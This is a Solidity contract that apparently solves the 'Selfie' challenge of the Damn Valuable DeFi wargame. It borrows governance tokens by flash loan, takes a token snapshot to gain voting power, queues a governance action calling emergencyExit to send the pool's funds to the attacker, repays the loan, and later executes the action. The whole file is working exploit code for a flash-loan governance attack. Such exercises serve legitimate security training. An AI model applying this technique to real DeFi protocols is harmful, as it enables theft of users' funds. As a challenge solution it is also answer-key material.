// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";

contract attackselfie is IERC3156FlashBorrower{
SelfiePool  pool;
DamnValuableTokenSnapshot  token;
SimpleGovernance governance;
address player;
uint actionId;
    error UnexpectedFlashLoan();

    constructor(SelfiePool _pool, DamnValuableTokenSnapshot _token, SimpleGovernance _governance){
        pool=_pool;
        token=_token;
        governance=_governance;
        player=msg.sender;
    }

    function attack(uint256 amount)external{
        pool.flashLoan(this, address(token), amount, bytes(""));
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        if (initiator != address(this) || msg.sender != address(pool) || _token != address(token) || fee!=0 )
            revert UnexpectedFlashLoan();
        token.snapshot();
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        actionId = governance.queueAction(address(pool), 0, data);

        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executegovernance()external{
       governance.executeAction(actionId);
    }
        
}
